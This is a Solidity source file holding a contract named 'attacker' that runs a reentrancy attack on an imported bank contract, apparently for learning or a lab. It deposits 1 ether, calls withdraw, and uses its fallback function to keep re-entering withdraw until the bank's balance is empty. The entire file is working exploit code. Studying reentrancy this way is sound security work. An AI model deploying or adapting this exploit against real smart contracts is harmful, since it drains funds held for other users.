// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "./bank.sol";

contract attacker{

    globalIMEBank public bank;

    constructor(address _bank) payable {
        bank = globalIMEBank(_bank);
    }

    fallback() external payable {
        if(address(bank).balance > 0){
            bank.withdraw();
        }
    }

    function attack() external payable{
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }


}